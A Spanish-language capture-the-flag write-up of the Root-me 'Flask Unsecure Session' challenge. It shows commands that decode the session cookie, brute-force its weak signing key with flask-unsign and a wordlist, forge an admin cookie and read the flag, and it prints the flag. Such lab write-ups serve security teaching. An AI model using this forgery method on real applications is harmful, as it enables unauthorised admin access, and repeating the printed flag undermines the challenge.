Root-me Write-up: Flask Unsecure Session

Análisis Inicial

Lo primero que se realizó en el reto fue un muestreo inicial a la página. Nos dimos cuenta de que para acceder a la zona root o a la consola de admin se requiere de privilegios elevados; sin embargo, la web no cuenta con un sistema de login visible.

Al realizar un curl a la página principal, observamos que el servidor maneja cookies de sesión de Flask:

```bash
~/.../root_me/flask_unsecure_sessiom $ curl -I http://challenge01.root-me.org:59084/
HTTP/1.1 200 OK
Server: Werkzeug/2.1.2 Python/3.11.9
Set-Cookie: session=eyJhZG1pbiI6ImZhbHNlIiwidXNlcm5hbWUiOiJndWVzdCJ9.aVhKmQ.rL5dpdYoFz8qqvcPi_pHU4zJmWM; HttpOnly; Path=/
Connection: close
```

Identificación de la Vulnerabilidad

De acuerdo a cómo Flask gestiona las sesiones de usuario (almacenándolas en el lado del cliente mediante cookies firmadas), procedemos a decodificar la cadena en Base64 para inspeccionar su contenido:

```bash
echo "eyJhZG1pbiI6ImZhbHNlIiwidXNlcm5hbWUiOiJndWVzdCJ9" | base64 -d
```

Resultado:

```
{"admin":"false","username":"guest"}
```

Con esto determinamos cómo Flask identifica a los usuarios guest y admin. La cookie también contiene una firma criptográfica que evita modificaciones, a menos que se obtenga la clave secreta.

Explotación

Para falsificar la sesión, utilizamos la herramienta flask-unsign junto con el diccionario rockyou.txt para realizar un ataque de fuerza bruta sobre la firma:

```bash
flask-unsign --unsign --cookie "eyJhZG1pbiI6ImZhbHNlIiwidXNlcm5hbWUiOiJndWVzdCJ9.aVhKmQ.rL5dpdYoFz8qqvcPi_pHU4zJmWM" --wordlist ../../../../../seclists/rockyou.txt --no-literal-eval

[*] Session decodes to: {'admin': 'false', 'username': 'guest'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 70144 attempts
b's3cr3t'
```

Una vez obtenida la SECRET_KEY (s3cr3t), procedemos a firmar una nueva cookie modificando el campo admin a true:

```bash
~/.../root_me/flask_unsecure_sessiom $ flask-unsign --sign --cookie "{'admin': 'true', 'username': 'admin'}" --secret 's3cr3t'
eyJhZG1pbiI6InRydWUiLCJ1c2VybmFtZSI6ImFkbWluIn0.aVhNFQ.ur-kDi2VKALU3leHmZRu-CBtMgA
```

Obtención de la Flag

Finalmente, enviamos la petición a la ruta /admin inyectando nuestra cookie manipulada:

```bash
curl -v -H "Cookie: session=eyJhZG1pbiI6InRydWUiLCJ1c2VybmFtZSI6ImFkbWluIn0.aVhNFQ.ur-kDi2VKALU3leHmZRu-CBtMgA" http://challenge01.root-me.org:59084/admin
```

Resultado:

```html
<div class="heading_container heading_center">
    <h2>Admin <span>console</span></h2>
    <p>Good job, use this flag: Fl4sK_mi5c0nfigur4ti0n</p>
</div>
```
